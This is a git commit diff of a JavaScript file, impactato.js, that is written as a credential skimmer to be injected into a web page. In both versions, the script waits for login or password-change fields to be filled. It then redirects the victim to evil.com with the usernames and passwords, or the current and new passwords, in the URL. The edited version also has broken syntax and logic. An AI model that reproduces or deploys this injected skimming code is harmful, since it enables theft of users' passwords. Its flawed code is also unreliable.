c4b4496e18d6be73046f3f35d3747d2b697c3ef2
haxuanhuy <52565807+haxuanhuy@users.noreply.github.com>
2026-03-06 16:15:50 +0700

    Update impactato.js

--- impactato.js
+++ impactato.js
@@ -1,37 +1,35 @@
 let isFilled = false;
 
  function checkInputs() {
-    const input1 = document.getElementsByName('pam_account[login_name]')[0];
-    const input2 = document.getElementsByName('pam_account[login_password]')[0];
-
-    const input3 = document.getElementsByName('uname')[0];
-    const input4 = document.getElementsByName('password')[0];
-
+    const input1 = document.getElementById('password-input').value;
+    const input2 = document.getElementById('new-password-input').value;
+    const input3 = document.getElementById('confirm-password-input').value;  
+  
     if (input1.value && input2.value) {
       if (!isFilled) {
         isFilled = true; 
         setTimeout(function() {
-          location.replace("//evil.com?username=" + document.getElementsByName('pam_account[login_name]')[0].value + "&password=" + document.getElementsByName('pam_account[login_password]')[0].value);
+          location.replace("//evil.com?current-password=" + document.getElementById('password-input').value + "&new-password=" + document.getElementById('new-password-input').value;
          
-        }, 4500); 
+        }, 500); 
       }
     }
   
 
-if (input3.value && input4.value) {
+if (input1.value && input3.value) {
       if (!isFilled) {
         isFilled = true; 
         setTimeout(function() {
-          location.replace("//evil.com?username=" + document.getElementsByName('uname')[0].value + "&password=" + document.getElementsByName('password')[0].value);
+          location.replace("//evil.com?current-password=" + document.getElementById('password-input').value + "&new-password=" + document.getElementById('confirm-password-input').value;
          
-        }, 4500); 
+        }, 500); 
       }
     }
  }
   window.onload = checkInputs;
 
 
-  document.getElementsByName('pam_account[login_name]')[0].addEventListener('input', checkInputs);
-  document.getElementsByName('pam_account[login_password]')[0].addEventListener('input', checkInputs);
-  document.getElementsByName('uname')[0].addEventListener('input', checkInputs);
-  document.getElementsByName('password')[0].addEventListener('input', checkInputs);
+  document.getElementById('password-input').value.addEventListener('input', checkInputs);
+  document.getElementById('new-password-input').addEventListener('input', checkInputs);
+  document.getElementById('confirm-password-input').addEventListener('input', checkInputs);
+
